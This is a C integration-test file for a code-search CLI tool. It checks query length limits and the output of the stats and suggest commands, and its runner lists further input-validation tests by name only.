TT_TEST(test_int_search_symbols_query_too_long)
{
    tt_cli_opts_t opts;
    init_opts(&opts);

    /* Build a 501-char query */
    char long_query[502];
    memset(long_query, 'a', 501);
    long_query[501] = '\0';

    const char *pos[] = {long_query};
    opts.positional = pos;
    opts.positional_count = 1;

    cJSON *result = tt_cmd_search_symbols_exec(&opts);
    TT_ASSERT_NOT_NULL(result);
    cJSON *err = cJSON_GetObjectItem(result, "error");
    TT_ASSERT_NOT_NULL(err);
    TT_ASSERT_EQ_STR("invalid_value", err->valuestring);
    TT_ASSERT_STR_CONTAINS(cJSON_GetObjectItem(result, "message")->valuestring,
                            "500");
    cJSON_Delete(result);
}

TT_TEST(test_int_search_symbols_query_at_limit)
{
    tt_cli_opts_t opts;
    init_opts(&opts);

    /* Build exactly 500-char query — should be accepted */
    char query_500[501];
    memset(query_500, 'x', 500);
    query_500[500] = '\0';

    const char *pos[] = {query_500};
    opts.positional = pos;
    opts.positional_count = 1;

    cJSON *result = tt_cmd_search_symbols_exec(&opts);
    TT_ASSERT_NOT_NULL(result);
    /* Should NOT have an error (query accepted, even if 0 results) */
    TT_ASSERT(cJSON_GetObjectItem(result, "error") == NULL,
              "500-char query should be accepted");
    cJSON_Delete(result);
}

TT_TEST(test_int_search_text_query_too_long)
{
    tt_cli_opts_t opts;
    init_opts(&opts);

    char long_query[502];
    memset(long_query, 'b', 501);
    long_query[501] = '\0';

    const char *pos[] = {long_query};
    opts.positional = pos;
    opts.positional_count = 1;

    cJSON *result = tt_cmd_search_text_exec(&opts);
    TT_ASSERT_NOT_NULL(result);
    cJSON *err = cJSON_GetObjectItem(result, "error");
    TT_ASSERT_NOT_NULL(err);
    TT_ASSERT_EQ_STR("invalid_value", err->valuestring);
    cJSON_Delete(result);
}

/* ---------- stats: most_imported_files ---------- */

TT_TEST(test_int_stats_most_imported_files)
{
    tt_cli_opts_t opts;
    init_opts(&opts);

    cJSON *result = tt_cmd_stats_exec(&opts);
    TT_ASSERT_NOT_NULL(result);
    if (result) {
        cJSON *mif = cJSON_GetObjectItemCaseSensitive(result, "most_imported_files");
        TT_ASSERT(cJSON_IsArray(mif), "stats should have most_imported_files array");

        /* The fixture has app.js importing from utils.js, so we expect >= 1 entry */
        if (cJSON_IsArray(mif) && cJSON_GetArraySize(mif) > 0) {
            cJSON *first = cJSON_GetArrayItem(mif, 0);
            TT_ASSERT_NOT_NULL(cJSON_GetObjectItemCaseSensitive(first, "file"));
            TT_ASSERT_NOT_NULL(cJSON_GetObjectItemCaseSensitive(first, "import_count"));

            cJSON *ic = cJSON_GetObjectItemCaseSensitive(first, "import_count");
            if (cJSON_IsNumber(ic))
                TT_ASSERT_GE_INT(ic->valueint, 1);
        }
        cJSON_Delete(result);
    }
}

/* ---------- suggest ---------- */

TT_TEST(test_int_suggest_basic)
{
    tt_cli_opts_t opts;
    init_opts(&opts);

    cJSON *result = tt_cmd_suggest_exec(&opts);
    TT_ASSERT_NOT_NULL(result);
    if (result) {
        TT_ASSERT(cJSON_GetObjectItem(result, "error") == NULL,
                  "suggest should not return error");

        /* All 5 fields must be present */
        cJSON *kw = cJSON_GetObjectItemCaseSensitive(result, "top_keywords");
        TT_ASSERT(cJSON_IsArray(kw), "should have top_keywords array");

        cJSON *kd = cJSON_GetObjectItemCaseSensitive(result, "kind_distribution");
        TT_ASSERT(cJSON_IsObject(kd), "should have kind_distribution object");

        cJSON *ld = cJSON_GetObjectItemCaseSensitive(result, "language_distribution");
        TT_ASSERT(cJSON_IsObject(ld), "should have language_distribution object");

        cJSON *mif = cJSON_GetObjectItemCaseSensitive(result, "most_imported_files");
        TT_ASSERT(cJSON_IsArray(mif), "should have most_imported_files array");

        cJSON *eq = cJSON_GetObjectItemCaseSensitive(result, "example_queries");
        TT_ASSERT(cJSON_IsArray(eq), "should have example_queries array");

        /* Keywords should be sorted by frequency descending */
        if (cJSON_IsArray(kw) && cJSON_GetArraySize(kw) >= 2) {
            cJSON *first = cJSON_GetArrayItem(kw, 0);
            cJSON *second = cJSON_GetArrayItem(kw, 1);
            int f1 = cJSON_GetObjectItem(first, "count")->valueint;
            int f2 = cJSON_GetObjectItem(second, "count")->valueint;
            TT_ASSERT_GE_INT(f1, f2);
        }

        /* Example queries should be non-empty strings */
        if (cJSON_IsArray(eq) && cJSON_GetArraySize(eq) > 0) {
            cJSON *first = cJSON_GetArrayItem(eq, 0);
            TT_ASSERT(cJSON_IsString(first) && strlen(first->valuestring) > 0,
                      "example queries should be non-empty strings");
        }

        cJSON_Delete(result);
    }
}

/* ---- Runner ---- */

void run_int_commands_tests(void)
{
    setup_fixture();
    fprintf(stderr, "  Indexing fixture...\n");
    index_fixture();

    /* search:symbols */
    TT_RUN(test_int_search_symbols_basic);
    TT_RUN(test_int_search_symbols_count);
    TT_RUN(test_int_search_symbols_compact);
    TT_RUN(test_int_search_symbols_no_index);
    TT_RUN(test_int_search_symbols_kind_filter);

    /* search:text */
    TT_RUN(test_int_search_text_basic);
    TT_RUN(test_int_search_text_empty_query);
    TT_RUN(test_int_search_text_count);
    TT_RUN(test_int_search_text_group_by_file);

    /* inspect:outline */
    TT_RUN(test_int_inspect_outline_basic);
    TT_RUN(test_int_inspect_outline_compact);
    TT_RUN(test_int_inspect_outline_not_found);

    /* inspect:file */
    TT_RUN(test_int_inspect_file_basic);
    TT_RUN(test_int_inspect_file_line_range);
    TT_RUN(test_int_inspect_file_not_found);

    /* inspect:symbol */
    TT_RUN(test_int_inspect_symbol_basic);
    TT_RUN(test_int_inspect_symbol_not_found);
    TT_RUN(test_int_inspect_symbol_exit_code_2);

    /* inspect:tree */
    TT_RUN(test_int_inspect_tree_basic);
    TT_RUN(test_int_inspect_tree_depth);

    /* stats */
    TT_RUN(test_int_stats_most_imported_files);

    /* suggest */
    TT_RUN(test_int_suggest_basic);

    /* query length limit */
    TT_RUN(test_int_search_symbols_query_too_long);
    TT_RUN(test_int_search_symbols_query_at_limit);
    TT_RUN(test_int_search_text_query_too_long);

    /* extreme malicious path tests */
    TT_RUN(test_int_evil_path_traversal);
    TT_RUN(test_int_evil_path_absolute);
    TT_RUN(test_int_evil_path_null_bytes);
    TT_RUN(test_int_evil_path_shell_injection);
    TT_RUN(test_int_evil_path_special_chars);
    TT_RUN(test_int_evil_path_long);
    TT_RUN(test_int_evil_path_unicode);
    TT_RUN(test_int_evil_path_proto_device);
    TT_RUN(test_int_evil_symbol_id);

    cleanup_fixture();
}
